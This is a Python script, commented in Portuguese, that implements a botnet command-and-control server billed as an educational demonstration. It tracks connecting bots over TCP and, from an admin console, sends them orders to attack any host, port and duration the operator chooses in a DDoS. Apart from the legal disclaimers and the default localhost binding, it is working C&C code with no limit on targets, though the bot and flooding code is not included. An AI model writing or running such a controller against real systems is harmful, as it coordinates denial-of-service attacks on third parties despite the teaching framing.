#!/usr/bin/env python3
"""
SERVIDOR C&C EDUCACIONAL - APENAS PARA FINS DE DEMONSTRAÇÃO
===========================================================
AVISO: Este código é apenas para fins educacionais e demonstração em palestras.
NÃO deve ser usado para atividades maliciosas ou ilegais.

Este servidor simula um Command and Control (C&C) server que gerencia bots
em uma demonstração controlada e local.
"""

import socket
import threading
import json
import time
from datetime import datetime
from typing import Dict, List

class EducationalCCServer:
    def __init__(self, host='127.0.0.1', port=9999):
        self.host = host
        self.port = port
        self.bots: Dict[str, dict] = {}
        self.attack_target = None
        self.attack_active = False
        self.server_socket = None
        
    def start(self):
        """Inicia o servidor C&C"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        
        print("=" * 60)
        print("SERVIDOR C&C EDUCACIONAL INICIADO")
        print("=" * 60)
        print(f"Escutando em {self.host}:{self.port}")
        print("AVISO: Apenas para demonstração educacional!")
        print("=" * 60)
        
        while True:
            client_socket, address = self.server_socket.accept()
            client_thread = threading.Thread(
                target=self.handle_bot_connection,
                args=(client_socket, address)
            )
            client_thread.daemon = True
            client_thread.start()
    
    def handle_bot_connection(self, client_socket, address):
        """Gerencia conexões de bots"""
        bot_id = f"{address[0]}:{address[1]}"
        
        try:
            # Recebe identificação do bot
            data = client_socket.recv(1024).decode('utf-8')
            bot_info = json.loads(data)
            
            self.bots[bot_id] = {
                'id': bot_id,
                'info': bot_info,
                'last_seen': datetime.now().isoformat(),
                'status': 'connected'
            }
            
            print(f"[+] Bot conectado: {bot_id} - {bot_info.get('name', 'Unknown')}")
            print(f"    Total de bots: {len(self.bots)}")
            
            # Loop de comando
            while True:
                if self.attack_active and self.attack_target:
                    command = {
                        'type': 'attack',
                        'target': self.attack_target['host'],
                        'port': self.attack_target['port'],
                        'duration': self.attack_target.get('duration', 10)
                    }
                else:
                    command = {'type': 'idle'}
                
                client_socket.send(json.dumps(command).encode('utf-8'))
                
                # Recebe status do bot
                try:
                    status = client_socket.recv(1024).decode('utf-8')
                    if status:
                        bot_status = json.loads(status)
                        self.bots[bot_id]['last_seen'] = datetime.now().isoformat()
                        self.bots[bot_id]['status'] = bot_status.get('status', 'active')
                except:
                    pass
                
                time.sleep(2)  # Intervalo de comunicação
                
        except Exception as e:
            print(f"[-] Erro com bot {bot_id}: {e}")
        finally:
            if bot_id in self.bots:
                del self.bots[bot_id]
            client_socket.close()
            print(f"[-] Bot desconectado: {bot_id}")
    
    def start_attack(self, target_host, target_port, duration=10):
        """Inicia um ataque DDoS simulado"""
        if not self.bots:
            print("[-] Nenhum bot conectado!")
            return False
        
        self.attack_target = {
            'host': target_host,
            'port': target_port,
            'duration': duration
        }
        self.attack_active = True
        
        print("=" * 60)
        print("ATAQUE INICIADO (SIMULAÇÃO EDUCACIONAL)")
        print("=" * 60)
        print(f"Alvo: {target_host}:{target_port}")
        print(f"Duração: {duration} segundos")
        print(f"Bots ativos: {len(self.bots)}")
        print("=" * 60)
        
        return True
    
    def stop_attack(self):
        """Para o ataque"""
        self.attack_active = False
        self.attack_target = None
        print("[+] Ataque parado")
    
    def get_status(self):
        """Retorna status do servidor"""
        return {
            'bots_connected': len(self.bots),
            'bots': list(self.bots.values()),
            'attack_active': self.attack_active,
            'attack_target': self.attack_target
        }

def main():
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║  SERVIDOR C&C EDUCACIONAL - DEMONSTRAÇÃO DE SEGURANÇA   ║
    ╚══════════════════════════════════════════════════════════╝
    
    AVISO LEGAL:
    Este software é apenas para fins educacionais e demonstração.
    O uso deste software para atividades maliciosas é ilegal.
    
    """)
    
    server = EducationalCCServer(host='127.0.0.1', port=9999)
    
    # Thread para comandos do administrador
    def admin_interface():
        time.sleep(2)  # Aguarda servidor iniciar
        print("\n[Interface Admin] Digite comandos:")
        print("  - 'status' - Ver status dos bots")
        print("  - 'attack <host> <port> <duration>' - Iniciar ataque")
        print("  - 'stop' - Parar ataque")
        print("  - 'quit' - Sair\n")
        
        while True:
            try:
                cmd = input("CC> ").strip().split()
                if not cmd:
                    continue
                
                if cmd[0] == 'status':
                    status = server.get_status()
                    print(f"\nStatus: {status['bots_connected']} bots conectados")
                    if status['attack_active']:
                        print(f"Ataque ativo: {status['attack_target']}")
                
                elif cmd[0] == 'attack' and len(cmd) >= 3:
                    host = cmd[1]
                    port = int(cmd[2])
                    duration = int(cmd[3]) if len(cmd) > 3 else 10
                    server.start_attack(host, port, duration)
                
                elif cmd[0] == 'stop':
                    server.stop_attack()
                
                elif cmd[0] == 'quit':
                    print("Encerrando servidor...")
                    break
                    
            except Exception as e:
                print(f"Erro: {e}")
    
    admin_thread = threading.Thread(target=admin_interface)
    admin_thread.daemon = True
    admin_thread.start()
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[+] Servidor encerrado")

if __name__ == '__main__':
    main()

